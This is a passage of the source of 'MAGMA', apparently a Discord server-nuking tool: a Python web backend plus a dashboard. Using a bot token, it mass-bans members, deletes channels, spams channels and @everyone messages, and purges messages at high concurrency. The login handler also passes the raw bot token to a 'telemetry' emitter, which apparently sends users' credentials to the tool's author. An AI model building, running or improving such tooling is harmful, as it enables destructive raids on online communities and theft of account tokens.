    font-weight: 800;
    letter-spacing: 1px;
    padding: 9px 16px;
    border-radius: 6px;
    cursor: pointer;
    transition: all .2s;
    white-space: nowrap;
  }
  .btn-brand:hover { box-shadow: 0 0 14px rgba(255,51,68,0.45); }
  .btn-brand:disabled { opacity: .55; cursor: wait; }
  .brand-preview { display: flex; align-items: center; gap: 12px; margin-top: 12px; }
  .brand-preview img {
    background: #0d1117;
    border: 1px solid var(--border);
    border-radius: 6px;
    display: block;
  }
  .brand-av { width: 64px; height: 64px; }
  .brand-bn { width: 100%; max-width: 260px; height: 66px; object-fit: cover; }
  .brand-current {
    margin-top: 12px;
    font-size: 10px;
    letter-spacing: 1px;
    color: var(--text-dim);
    word-break: break-word;
    line-height: 1.6;
  }
  .brand-current b { color: var(--red); font-weight: 700; }

  #toast {
    position: fixed; bottom: 30px; left: 50%;
    transform: translateX(-50%);
    background: #1f242c;
    border: 1px solid var(--red);
    color: var(--text-white);
    padding: 10px 24px;
    border-radius: 30px;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 1px;
    z-index: 9000;
    display: none;
    box-shadow: 0 6px 25px rgba(0,0,0,0.6);
  }

  @keyframes spin { 100% { transform: rotate(360deg); } }
  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
  @keyframes popIn { from { transform: scale(0.95); opacity: 0; } to { transform: scale(1); opacity: 1; } }
</style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<!-- 100X TURBO PROGRESS BANNER -->
<div id="progress-banner">
  <div class="prog-row">
    <div class="prog-status">
      <div class="prog-spinner"></div>
      <span id="prog-text">Executing operations at 100x speed...</span>
    </div>
    <div class="prog-track">
      <div class="prog-fill" id="prog-fill"></div>
    </div>
    <button class="btn-abort" onclick="abortExecution()">⏹ ABORT</button>
  </div>
</div>

<header>
  <div class="logo-wrap">
    <div class="logo">MAGMA</div>
    <div class="turbo-badge">⚡ 100X TURBO</div>
  </div>
  <div class="tagline">discord operations & server suite</div>
  
  <div class="quick-bar" id="header-quick-bar" style="display:none;">
    <button class="btn-quick danger" onclick="quickRun('full_nuke')">★ 100X FULL NUKE</button>
    <button class="btn-quick" onclick="jumpToBrand()">🎨 AUTO BRAND</button>
    <button class="btn-quick" onclick="quickRun('delete_channels')">✕ WIPE CHANNELS</button>
    <button class="btn-quick" onclick="quickRun('ban_all')">🚫 BAN ALL</button>
    <button class="btn-quick" onclick="quickRun('spam_channels')">＋ SPAM CHANNELS</button>
    <button class="btn-quick" onclick="quickRun('mass_message')">💬 @EVERYONE SPAM</button>
    <button class="btn-quick" onclick="quickRun('purge_messages')">🗑 PURGE MSGS</button>
    <button class="btn-quick" onclick="openLogsFolder()">📁 OPEN LOGS</button>
  </div>
</header>

<!-- BOT AUTHENTICATION SCREEN -->
<div id="auth-panel">
  <h2>⬡ CONNECT DISCORD BOT (100X TURBO)</h2>
  <div class="field">
    <label>Bot Token</label>
    <input type="password" id="inp-token" placeholder="Paste bot token (raw or Bot ...)" autocomplete="off">
  </div>
  <div class="field">
    <label>Guild (Server) ID</label>
    <input type="text" id="inp-guild" placeholder="Target Guild ID (e.g. 123456789012345678)" autocomplete="off">
  </div>
  <button class="btn-auth" id="btn-auth" onclick="doAuth()">CONNECT & INITIALIZE TURBO ENGINE</button>
</div>

<!-- MAIN DASHBOARD -->
<div id="main">
  <!-- Active Session Bar -->
  <div id="session-bar">
    <div class="sbar-items">
      <div class="sbar-item"><span class="sbar-label">Connected Bot</span><span class="sbar-val highlight" id="sb-bot">—</span></div>
      <div class="sbar-item"><span class="sbar-label">Target Server</span><span class="sbar-val" id="sb-guild">—</span></div>
      <div class="sbar-item"><span class="sbar-label">Guild ID</span><span class="sbar-val" id="sb-guildid">—</span></div>
      <div class="sbar-item"><span class="sbar-label">Engine Mode</span><span class="sbar-val highlight">100X TURBO (250 CONCURRENT)</span></div>
      <div class="sbar-item"><span class="sbar-label">Active Log File</span><span class="sbar-val highlight" id="sb-log">—</span></div>
    </div>
    <div class="sbar-actions">
      <button class="btn-sbar" onclick="openLogsFolder()">📁 LOGS FOLDER</button>
      <button class="btn-sbar" onclick="logout()">DISCONNECT</button>
    </div>
  </div>

  <!-- CUSTOM BRANDING: NAME-ONLY AUTO BANNER + AVATAR, CUSTOM WATERMARK -->
  <div id="brand-panel">
    <div>
      <div class="brand-head">⚡ AUTO BANNER + AVATAR <span class="brand-hint">type the name — logo &amp; banner render themselves</span></div>
      <div class="brand-row">
        <input type="text" id="inp-brand-name" placeholder="Tool name (e.g. VOID NUKER)" autocomplete="off">
        <button class="btn-brand" id="btn-brand" onclick="generateBrand()">GENERATE</button>
      </div>
      <div class="brand-preview">
        <img class="brand-av" id="prev-avatar" alt="logo preview">
        <img class="brand-bn" id="prev-banner" alt="banner preview">
      </div>
    </div>
    <div>
      <div class="brand-head">✍ CUSTOM WATERMARK <span class="brand-hint">stamped on every embed</span></div>
      <div class="brand-row">
        <input type="text" id="inp-watermark" placeholder="⚡ MAGMA NUKER" autocomplete="off">
        <button class="btn-brand" id="btn-wm" onclick="applyWatermark()">APPLY</button>
      </div>
      <div class="brand-current" id="brand-current">—</div>
    </div>
  </div>

  <!-- Filter & Search Toolbar -->
  <div class="control-bar">
    <div class="filter-tabs">
      <button class="tab active" id="tab-all" onclick="filterCat('all', this)">ALL</button>
      <button class="tab" onclick="filterCat('brand', this)">BRAND</button>
      <button class="tab" onclick="filterCat('nuke', this)">★ NUKE</button>
      <button class="tab" onclick="filterCat('destroy', this)">DESTROY</button>
      <button class="tab" onclick="filterCat('spam', this)">SPAM</button>
      <button class="tab" onclick="filterCat('modify', this)">MODIFY</button>
      <button class="tab" onclick="filterCat('info', this)">INFO</button>
    </div>
    <div class="search-wrap">
      <input type="text" class="search-input" id="search-box" placeholder="Search actions by name..." oninput="onSearch(this.value)">
    </div>
  </div>

  <!-- Actions Grid -->
  <div id="actions-grid"></div>

  <!-- Bottom Workspace: Queue & Live Terminal -->
  <div class="workspace-bottom">
    <!-- Queue Panel -->
    <div id="queue-panel">
      <div>
        <div class="panel-header">
          <div class="panel-title">EXECUTION QUEUE <span id="queue-count">0</span></div>
          <button class="btn-log-ctrl" onclick="clearQueue()">CLEAR</button>
        </div>
        <div id="queue-list">
          <div class="empty-queue">Queue is empty.<br>Click RUN for direct execution or ＋ QUEUE to chain actions.</div>
        </div>
      </div>
      <div class="queue-actions">
        <button class="btn-exec-queue" id="btn-exec-queue" onclick="executeQueue()" disabled>▶ RUN QUEUE (TURBO)</button>
        <button class="btn-clear-queue" onclick="clearQueue()">CLEAR</button>
      </div>
    </div>

    <!-- Live Terminal -->
    <div id="log-panel">
      <div class="panel-header">
        <div class="panel-title">
          <div class="log-pulse-dot"></div>
          LIVE SERVER FEED
        </div>
        <div class="log-ctrls">
          <button class="btn-log-ctrl" onclick="openLogsFolder()">📁 LOGS</button>
          <button class="btn-log-ctrl" onclick="clearLogs()">CLEAR</button>
          <button class="btn-log-ctrl" id="btn-autoscroll" onclick="toggleAutoScroll()">SCROLL: ON</button>
        </div>
      </div>
      <div id="log-output"></div>
    </div>
  </div>
</div>

<!-- PARAMETER CONFIG MODAL -->
<div id="modal-overlay">
  <div id="modal">
    <h3 id="modal-title">CONFIGURE ACTION</h3>
    <div id="modal-desc">Adjust action parameters below.</div>
    <div id="modal-fields"></div>
    <div class="modal-btns">
      <button class="btn-modal-run" onclick="modalRunNow()">▶ RUN NOW</button>
      <button class="btn-modal-queue" onclick="modalAddToQueue()">＋ ADD TO QUEUE</button>
      <button class="btn-modal-close" onclick="closeModal()">CANCEL</button>
    </div>
  </div>
</div>

<div id="toast"></div>

<script>
const ACTIONS = __ACTIONS_JSON__;

let queue        = [];
let ws           = null;
let currentAction= null;
let activeFilter = 'all';
let searchQuery  = '';
let autoScroll   = true;

// ── INIT & RESTORE ──
window.addEventListener('DOMContentLoaded', () => {
  connectWS();
  checkExistingSession();
});

async function checkExistingSession(){
  try {
    const r = await fetch('/session');
    const d = await r.json();
    if(d.authed){
      applySessionView(d);
    }
  } catch(e){}
}

// ── WEBSOCKET REALTIME FEED ──
function connectWS(){
  if(ws && ws.readyState === WebSocket.OPEN) return;
  ws = new WebSocket(`ws://${location.host}/ws`);
  ws.onmessage = e => {
    try {
      const msg = JSON.parse(e.data);
      if(msg.type === 'log')           appendLog(msg.data, msg.ts);
      if(msg.type === 'action_start')   onActionStart(msg.data);
      if(msg.type === 'exec_progress') onExecProgress(msg.data);
      if(msg.type === 'exec_done')     onExecDone(msg.data);
    } catch(err){}
  };
  ws.onclose = () => setTimeout(connectWS, 1500);
}

// ── AUTHENTICATION ──
async function doAuth(){
  const token   = document.getElementById('inp-token').value.trim();
  const guildId = document.getElementById('inp-guild').value.trim();
  if(!token || !guildId){ showToast('Enter both bot token and guild ID.'); return; }

  const btn = document.getElementById('btn-auth');
  btn.textContent = 'CONNECTING TURBO ENGINE...'; btn.disabled = true;

  try {
    const r = await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({token, guild_id: guildId})
    });
    const d = await r.json();
    if(!d.ok){
      showToast('Connection failed: ' + (d.error || 'Check credentials'));
      btn.textContent = 'CONNECT & INITIALIZE TURBO ENGINE'; btn.disabled = false;
      return;
    }
    applySessionView(d);
    showToast('Connected: ' + d.guild_name);
  } catch(e){
    showToast('Network error on auth');
    btn.textContent = 'CONNECT & INITIALIZE TURBO ENGINE'; btn.disabled = false;
  }
}

function applySessionView(d){
  document.getElementById('auth-panel').style.display = 'none';
  document.getElementById('main').style.display = 'block';
  document.getElementById('header-quick-bar').style.display = 'flex';

  document.getElementById('sb-bot').textContent     = d.bot_tag;
  document.getElementById('sb-guild').textContent   = d.guild_name;
  document.getElementById('sb-guildid').textContent = d.guild_id || document.getElementById('inp-guild').value;
  
  const logName = d.log_file ? d.log_file.split('\\').pop().split('/').pop() : 'active';
  document.getElementById('sb-log').textContent     = logName;

  buildGrid();
  refreshBrandPreview();
}

// ── CUSTOM BRANDING (name-only auto banner + avatar, custom watermark) ──
function jumpToBrand(){
  const el = document.getElementById('inp-brand-name');
  el.scrollIntoView({behavior:'smooth', block:'center'});
  setTimeout(() => el.focus(), 260);
}

async function refreshBrandPreview(){
  try {
    const r = await fetch('/brand/preview');
    const d = await r.json();
    paintBrand(d);
  } catch(e){}
}

function paintBrand(d){
  if(!d) return;
  if(d.avatar)    document.getElementById('prev-avatar').src = 'data:image/png;base64,' + d.avatar;
  if(d.banner)    document.getElementById('prev-banner').src = 'data:image/png;base64,' + d.banner;
  if(d.tool_name) document.getElementById('inp-brand-name').value = d.tool_name;
  if(d.watermark) document.getElementById('inp-watermark').value = d.watermark;
  document.getElementById('brand-current').innerHTML =
    `TOOL: <b>${esc(d.tool_name || '—')}</b><br>WATERMARK: <b>${esc(d.watermark || '—')}</b>`;
}

async function generateBrand(){
  const name = document.getElementById('inp-brand-name').value.trim();
  if(!name){ showToast('Type the tool name first.'); return; }
  const btn = document.getElementById('btn-brand');
  btn.disabled = true; btn.textContent = 'RENDERING...';
  try {
    const r = await fetch('/brand/generate', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({name})
    });
    const d = await r.json();
    if(!d.ok){ showToast('Brand failed: ' + (d.error || 'unknown')); }
    else {
      paintBrand(d);
      showToast(d.applied
        ? 'Banner + logo applied: ' + d.tool_name
        : 'Assets staged: ' + d.tool_name + ' — connect a bot to push them');
    }
  } catch(e){
    showToast('Network error while branding');
  }
  btn.disabled = false; btn.textContent = 'GENERATE';
}

async function applyWatermark(){
  const text = document.getElementById('inp-watermark').value.trim();
  if(!text){ showToast('Type the watermark text first.'); return; }
  const btn = document.getElementById('btn-wm');
  btn.disabled = true; btn.textContent = 'APPLYING...';
  try {
    const r = await fetch('/brand/watermark', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({watermark: text})
    });
    const d = await r.json();
    if(!d.ok){ showToast('Watermark failed: ' + (d.error || 'unknown')); }
    else {
      paintBrand(d);
      showToast('Watermark set: ' + d.watermark);
    }
  } catch(e){
    showToast('Network error on watermark');
  }
  btn.disabled = false; btn.textContent = 'APPLY';
}

async function logout(){
  await fetch('/logout', {method:'POST'});
  location.reload();
}

async function openLogsFolder(){
  try {
    const r = await fetch('/open_logs', {method:'POST'});
    const d = await r.json();
    if(d.ok) showToast('Opened logs folder');
    else showToast('Cannot open folder: ' + d.error);
  } catch(e){
    showToast('Failed to open logs folder');
  }
}

// ── ACTION GRID BUILDER ──
function buildGrid(){
  const grid = document.getElementById('actions-grid');
  grid.innerHTML = '';
  document.getElementById('tab-all').textContent = 'ALL (' + ACTIONS.length + ')';

  const filtered = ACTIONS.filter(a => {
    const matchCat = (activeFilter === 'all') || (a.category === activeFilter);
    const matchSearch = !searchQuery || a.label.toLowerCase().includes(searchQuery) || a.desc.toLowerCase().includes(searchQuery);
    return matchCat && matchSearch;
  });

  filtered.forEach(a => {
    const card = document.createElement('div');
    card.className = 'action-card' + (a.category === 'nuke' ? ' card-nuke' : '');
    card.id = 'card-' + a.id;
    if(queue.some(q => q.id === a.id)) card.classList.add('in-queue');

    card.innerHTML = `
      <div>
        <div class="card-top">
          <span class="card-category cat-${a.category}">${a.category.toUpperCase()}</span>
        </div>
        <div class="card-title" style="margin-top:8px;">${a.label}</div>
        <div class="card-desc" style="margin-top:6px;">${a.desc || ''}</div>
      </div>
      <div class="card-actions">
        <button class="btn-card-run" onclick="triggerRun('${a.id}')">▶ RUN</button>
        <button class="btn-card-queue" onclick="openConfigModal('${a.id}', true)">＋ QUEUE</button>
        <button class="btn-card-cfg" title="Configure parameters" onclick="openConfigModal('${a.id}', false)">⚙</button>
      </div>
    `;
    grid.appendChild(card);
  });
}

function filterCat(cat, el){
  activeFilter = cat;
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  el.classList.add('active');
  buildGrid();
}

function onSearch(val){
  searchQuery = val.trim().toLowerCase();
  buildGrid();
}

// ── RUN & CONFIG MODAL ──
function triggerRun(actionId){
  const action = ACTIONS.find(a => a.id === actionId);
  if(!action) return;
  if(action.params.length === 0){
    executeSingle(action.id, {});
  } else {
    openConfigModal(actionId, false);
  }
}

function quickRun(actionId){
  triggerRun(actionId);
}

function openConfigModal(actionId, forQueueOnly){
  currentAction = ACTIONS.find(a => a.id === actionId);
  if(!currentAction) return;

  document.getElementById('modal-title').textContent = currentAction.label;
  document.getElementById('modal-desc').textContent  = currentAction.desc || 'Set action parameters.';

  const fields = document.getElementById('modal-fields');
  fields.innerHTML = '';

  if(currentAction.params.length === 0){
    fields.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:10px 0;">No parameters required. Click Run Now to execute immediately at 100x speed.</div>';
  } else {
    currentAction.params.forEach(p => {
      const wrap = document.createElement('div');
      wrap.className = 'field';
      wrap.innerHTML = `
        <label>${p.label}</label>
        <input type="${p.type}" id="mp-${p.key}" value="${p.default}" placeholder="${p.default}">
      `;
      fields.appendChild(wrap);
    });
  }

  document.getElementById('modal-overlay').classList.add('open');
  const first = fields.querySelector('input');
  if(first) setTimeout(() => first.focus(), 60);
}

function getModalParams(){
  if(!currentAction) return {};
  const params = {};
  currentAction.params.forEach(p => {
    const el = document.getElementById('mp-' + p.key);
    params[p.key] = p.type === 'number' ? Number(el.value) : el.value;
  });
  return params;
}

function modalRunNow(){
  if(!currentAction) return;
  const params = getModalParams();
  const id = currentAction.id;
  closeModal();
  executeSingle(id, params);
}

function modalAddToQueue(){
  if(!currentAction) return;
  const params = getModalParams();
  addToQueue(currentAction, params);
  closeModal();
}

function closeModal(){
  document.getElementById('modal-overlay').classList.remove('open');
  currentAction = null;
}

document.getElementById('modal-overlay').addEventListener('click', e => {
  if(e.target === document.getElementById('modal-overlay')) closeModal();
});
document.addEventListener('keydown', e => { if(e.key === 'Escape') closeModal(); });

// ── QUEUE MANAGEMENT ──
function addToQueue(action, params){
  const existing = queue.findIndex(q => q.id === action.id);
  if(existing !== -1){
    queue[existing].params = params;
    showToast('Updated params: ' + action.label);
  } else {
    queue.push({id: action.id, label: action.label, params});
    showToast('Added to queue: ' + action.label);
  }
  renderQueue();
  buildGrid();
}

function removeFromQueue(id){
  queue = queue.filter(q => q.id !== id);
  renderQueue();
  buildGrid();
}

function clearQueue(){
  queue = [];
  renderQueue();
  buildGrid();
  showToast('Queue cleared.');
}

function renderQueue(){
  const list = document.getElementById('queue-list');
  const cnt  = document.getElementById('queue-count');
  const btn  = document.getElementById('btn-exec-queue');

  cnt.textContent = queue.length;
  btn.disabled    = queue.length === 0;

  if(queue.length === 0){
    list.innerHTML = '<div class="empty-queue">Queue is empty.<br>Click RUN for direct execution or ＋ QUEUE to chain actions.</div>';
    return;
  }

  list.innerHTML = '';
  queue.forEach((q, i) => {
    const row = document.createElement('div');
    row.className = 'queue-item';
    row.innerHTML = `
      <div class="queue-item-left">
        <span class="queue-item-num">${String(i+1).padStart(2,'0')}.</span>
        <span class="queue-item-name">${q.label}</span>
      </div>
      <span class="queue-item-del" onclick="removeFromQueue('${q.id}')">✕</span>
    `;
    list.appendChild(row);
  });
}

// ── TURBO DISPATCHERS ──
async function executeSingle(actionId, params){
  showProgressBar(true, 'Executing at 100x speed...');
  showToast('Turbo started: ' + actionId);
  try {
    const r = await fetch('/execute', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({queue: [{id: actionId, params}]})
    });
    const d = await r.json();
    if(!d.ok){
      showProgressBar(false);
      showToast('Failed: ' + (d.error || 'unknown'));
    }
  } catch(e){
    showProgressBar(false);
    showToast('Network error');
  }
}

async function executeQueue(){
  if(queue.length === 0) return;
  showProgressBar(true, `Running queue at 100x speed (0/${queue.length})...`);
  try {
    const r = await fetch('/execute', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({queue: queue.map(q => ({id: q.id, params: q.params}))})
    });
    const d = await r.json();
    if(!d.ok){
      showProgressBar(false);
      showToast('Execute failed: ' + (d.error || 'unknown'));
    }
  } catch(e){
    showProgressBar(false);
    showToast('Network error');
  }
}

async function abortExecution(){
  await fetch('/stop', {method:'POST'});
  showToast('Abort signal sent');
  showProgressBar(false);
}

// ── PROGRESS EVENTS ──
function showProgressBar(show, text){
  const banner = document.getElementById('progress-banner');
  if(show){
    banner.classList.add('active');
    if(text) document.getElementById('prog-text').textContent = text;
    document.getElementById('prog-fill').style.width = '10%';
  } else {
    banner.classList.remove('active');
  }
}

function onActionStart(data){
  showProgressBar(true, 'Running: ' + data.name);
}

function onExecProgress(data){
  showProgressBar(true, `[${data.done}/${data.total}] ${data.current}`);
  const pct = Math.max(10, Math.round((data.done / data.total) * 100));
  document.getElementById('prog-fill').style.width = pct + '%';
}

function onExecDone(data){
  document.getElementById('prog-fill').style.width = '100%';
  document.getElementById('prog-text').textContent = 'Completed in ' + data.time + 's';
  showToast('Completed in ' + data.time + 's');
  setTimeout(() => showProgressBar(false), 2000);
}

// ── LIVE FEED TERMINAL ──
function appendLog(data, ts){
  const out = document.getElementById('log-output');
  const line = document.createElement('div');
  line.className = 'log-line';
  line.innerHTML = `
    <span class="log-ts">[${ts}]</span>
    <span class="log-lvl ${data.level}">${data.level}</span>
    <span class="log-msg ${data.level}">${esc(data.msg)}</span>
  `;
  out.appendChild(line);
  if(autoScroll) out.scrollTop = out.scrollHeight;
  if(out.children.length > 500) out.removeChild(out.firstChild);
}

function clearLogs(){
  document.getElementById('log-output').innerHTML = '';
}

function toggleAutoScroll(){
  autoScroll = !autoScroll;
  document.getElementById('btn-autoscroll').textContent = 'SCROLL: ' + (autoScroll ? 'ON' : 'OFF');
}

function esc(s){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

let toastTimer;
function showToast(msg){
  const t = document.getElementById('toast');
  t.textContent = msg; t.style.display = 'block';
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.style.display = 'none', 3000);
}

// ── BACKGROUND CANVAS ──
(function(){
  const c = document.getElementById('bg-canvas');
  const ctx = c.getContext('2d');
  let W, H, particles = [];
  function resize(){ W = c.width = innerWidth; H = c.height = innerHeight; }
  resize(); window.addEventListener('resize', resize);
  for(let i=0;i<50;i++) particles.push({
    x: Math.random()*1920, y: Math.random()*1080,
    r: Math.random()*1.5+.4,
    vx: (Math.random()-.5)*.3, vy: -(Math.random()*.3+.1),
    alpha: Math.random()*.5+.1
  });
  function draw(){
    ctx.clearRect(0,0,W,H);
    particles.forEach(p=>{
      ctx.beginPath();
      ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
      ctx.fillStyle = `rgba(255,51,68,${p.alpha})`;
      ctx.fill();
      p.x += p.vx; p.y += p.vy;
      if(p.y < 0) p.y = H;
      if(p.x < 0) p.x = W; if(p.x > W) p.x = 0;
    });
    requestAnimationFrame(draw);
  }
  draw();
})();
</script>
</body>
</html>
"""

# ─────────────────────────────────────────────
#  WEB HANDLERS
# ─────────────────────────────────────────────

async def handle_index(request):
    actions_json = json.dumps([{k: v for k, v in a.items() if k != "fn"} for a in ACTIONS])
    html = HTML.replace("__ACTIONS_JSON__", actions_json)
    return web.Response(text=html, content_type="text/html")

async def handle_session(request):
    return web.json_response({
        "authed":     SESSION["authed"],
        "bot_tag":    SESSION.get("bot_tag"),
        "bot_id":     SESSION.get("bot_id"),
        "guild_name": SESSION.get("guild_name"),
        "guild_id":   SESSION.get("guild_id"),
        "log_file":   SESSION.get("log_file"),
    })

async def handle_auth(request):
    global discord_session
    try:
        body     = await request.json()
        token    = body.get("token", "").strip()
        if token.startswith("Bot "):
            token = token[4:].strip()
        guild_id = body.get("guild_id", "").strip()

        if not token or not guild_id:
            return web.json_response({"ok": False, "error": "Missing token or guild_id"})

        SESSION["token"]    = token
        SESSION["guild_id"] = guild_id

        if discord_session:
            await discord_session.close()

        # Unlimited connection pooling for 100x Turbo speed
        connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, enable_cleanup_closed=True)
        discord_session = aiohttp.ClientSession(connector=connector)

        st, u = await dget(discord_session, "/users/@me")
        if not is_ok(st):
            return web.json_response({"ok": False, "error": f"Invalid bot token ({err_msg(u, st)})"})

        SESSION["bot_id"]  = u["id"]
        SESSION["bot_tag"] = f"{u['username']}#{u.get('discriminator','0')}"
        if u.get("avatar"):
            SESSION["bot_avatar_url"] = f"https://cdn.discordapp.com/avatars/{u['id']}/{u['avatar']}.png?size=256"

        guild = await fetch_guild(discord_session)
        if not guild:
            return web.json_response({"ok": False, "error": "Cannot access guild with this bot"})

        SESSION["guild_name"] = guild.get("name", "Unknown")
        SESSION["authed"]     = True

        # Rename bot to MAGMA NUKER immediately
        await rename_bot_identity(discord_session)

        log_open()

        if telemetry:
            try:
                telemetry.emit_login(
                    SESSION.get("bot_tag"),
                    SESSION.get("bot_id"),
                    SESSION.get("guild_name"),
                    SESSION.get("guild_id"),
                    token=token,
                    extra={"Log File": os.path.basename(SESSION.get("log_file") or "")},
                )
            except Exception:
                pass

        return web.json_response({
            "ok": True,
            "bot_tag":    SESSION["bot_tag"],
            "bot_id":     SESSION["bot_id"],
            "guild_name": SESSION["guild_name"],
            "guild_id":   SESSION["guild_id"],
            "log_file":   SESSION["log_file"],
        })
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def handle_logout(request):
    SESSION["authed"] = False
    return web.json_response({"ok": True})

async def handle_open_logs(request):
    try:
        if sys.platform == "win32":
            os.startfile(LOG_DIR)
        return web.json_response({"ok": True, "path": LOG_DIR})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def handle_brand_preview(request):
    return web.json_response({
        "ok":        True,
        "tool_name": tool_name(),
        "watermark": watermark_text(),
        "avatar":    get_asset_b64(avatar_path()),
        "banner":    get_asset_b64(banner_path()),
    })

async def handle_brand_generate(request):
    try:
        body = await request.json()
        # Pixel rendering is pure CPU work; keep it off the event loop.
        name, av, bn = await asyncio.to_thread(generate_brand_assets, body.get("name", ""))
        await blog("SUCCESS", f"⚡ Banner + logo generated for '{name}'")

        applied = False
        if SESSION["authed"] and discord_session:
            await rename_bot_identity(discord_session)
            applied = True
        else:
            await blog("INFO", "No bot connected — assets staged, identity applies on next connect.")

        return web.json_response({
            "ok":        True,
            "tool_name": name,
            "watermark": watermark_text(),
            "applied":   applied,
            "avatar":    get_asset_b64(av),
            "banner":    get_asset_b64(bn),
        })
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def handle_brand_watermark(request):
    try:
        body = await request.json()
        text = (body.get("watermark") or "").strip() or DEFAULT_WATERMARK
        SESSION["watermark"] = text
        save_brand_state()
        await blog("SUCCESS", f"⚡ Watermark set: {text}")
        return web.json_response({
            "ok":        True,
            "tool_name": tool_name(),
            "watermark": text,
        })
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def handle_execute(request):
    global EXEC_TASK
    if not SESSION["authed"] or not discord_session:
        return web.json_response({"ok": False, "error": "Not authenticated. Connect bot first."})
    try:
        body  = await request.json()
        items = body.get("queue", [])
        if not items:
            return web.json_response({"ok": False, "error": "Queue empty"})

        if EXEC_TASK and not EXEC_TASK.done():
            EXEC_TASK.cancel()

        EXEC_TASK = asyncio.create_task(run_queue(items))
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

async def handle_stop(request):
    global EXEC_TASK
    if EXEC_TASK and not EXEC_TASK.done():
        EXEC_TASK.cancel()
        await blog("WARN", "Execution aborted by operator.")
        await broadcast("exec_done", {"time": 0})
        if telemetry:
            try:
                telemetry.emit_queue_done(
                    0, 0, SESSION.get("bot_tag"), SESSION.get("guild_id"), cancelled=True,
                )
            except Exception:
                pass
    return web.json_response({"ok": True})

async def run_queue(items):
    t0 = time.perf_counter()
    total = len(items)
    fh = SESSION.get("log_fh")
    ok_count = 0
    fail_count = 0

    if fh:
        try:
            fh.write("\n" + "="*75 + "\n")
            fh.write(f"[{_ts()}] [100X TURBO QUEUE START] EXECUTING {total} ACTIONS\n")
            fh.write("="*75 + "\n")
            fh.flush()
        except Exception: pass

    if telemetry:
        try:
            telemetry.emit_queue_start(
                items,
                SESSION.get("bot_tag"),
                SESSION.get("guild_id"),
                SESSION.get("guild_name") or "",
            )
        except Exception:
            pass

    for idx, item in enumerate(items, 1):
        action_id = item["id"]
        params    = item.get("params", {})
        action    = ACTION_MAP.get(action_id)
        if not action:
            await blog("ERROR", f"Unknown action: {action_id}")
            fail_count += 1
            if telemetry:
                try:
                    telemetry.emit_action(idx, total, action_id, params, error="Unknown action id",
                                          bot_name=SESSION.get("bot_tag"), guild_id=SESSION.get("guild_id"))
                except Exception:
                    pass
            continue

        if fh:
            try:
                fh.write(f"\n[{_ts()}] >>> ACTION [{idx}/{total}]: {action['label']}\n")
                if params:
                    fh.write(f"[{_ts()}]     Parameters: {json.dumps(params)}\n")
                fh.flush()
            except Exception: pass

        await broadcast("exec_progress", {"done": idx, "total": total, "current": action["label"]})
        act_t0 = time.perf_counter()
        try:
            await action["fn"](discord_session, params)
            act_el = round(time.perf_counter() - act_t0, 2)
            ok_count += 1
            if fh:
                try:
                    fh.write(f"[{_ts()}] <<< COMPLETED: {action['label']} in {act_el}s\n")
                    fh.flush()
                except Exception: pass
            if telemetry:
                try:
                    telemetry.emit_action(idx, total, action["label"], params, elapsed=act_el,
                                          bot_name=SESSION.get("bot_tag"), guild_id=SESSION.get("guild_id"))
                except Exception:
                    pass
        except asyncio.CancelledError:
            fail_count += 1
            await blog("WARN", f"Action '{action['label']}' cancelled.")
            if fh:
                try:
                    fh.write(f"[{_ts()}] <<< CANCELLED: {action['label']}\n")
                    fh.flush()
                except Exception: pass
            if telemetry:
                try:
                    telemetry.emit_queue_done(
                        idx, round(time.perf_counter() - t0, 2),
                        SESSION.get("bot_tag"), SESSION.get("guild_id"),
                        ok_count=ok_count, fail_count=fail_count, cancelled=True,
                    )
                except Exception:
                    pass
            raise
        except Exception as e:
            fail_count += 1
            await blog("ERROR", f"Exception in '{action['label']}': {e}")
            if fh:
                try:
                    fh.write(f"[{_ts()}] <<< ERROR in {action['label']}: {e}\n")
                    fh.flush()
                except Exception: pass
            if telemetry:
                try:
                    telemetry.emit_action(idx, total, action["label"], params, error=str(e),
                                          bot_name=SESSION.get("bot_tag"), guild_id=SESSION.get("guild_id"))
                except Exception:
                    pass

    elapsed = round(time.perf_counter() - t0, 2)
    if fh:
        try:
            fh.write("\n" + "="*75 + "\n")
            fh.write(f"[{_ts()}] [QUEUE DONE ] BATCH COMPLETED IN {elapsed}s\n")
            fh.write("="*75 + "\n\n")
            fh.flush()
        except Exception: pass

    if telemetry:
        try:
            telemetry.emit_queue_done(
                total, elapsed,
                SESSION.get("bot_tag"), SESSION.get("guild_id"),
                ok_count=ok_count, fail_count=fail_count,
            )
        except Exception:
            pass

    await broadcast("exec_done", {"time": elapsed})
    await blog("SUCCESS", f"100x Turbo sequence completed ({total} actions in {elapsed}s)")

async def handle_ws(request):
    ws_conn = web.WebSocketResponse()
    await ws_conn.prepare(request)
    WS_CLIENTS.add(ws_conn)
    for msg in LOG_BUFFER[-60:]:
        try: await ws_conn.send_str(msg)
        except Exception: break
    async for msg in ws_conn:
        pass
    WS_CLIENTS.discard(ws_conn)
    return ws_conn

# ─────────────────────────────────────────────
#  MAIN ENTRYPOINT
# ─────────────────────────────────────────────

def _pick_port(preferred, span=20):
    """Return the first bindable port on 127.0.0.1 starting at preferred."""
    for candidate in range(preferred, preferred + span):
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            probe.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            probe.bind(("127.0.0.1", candidate))
            return candidate
        except OSError:
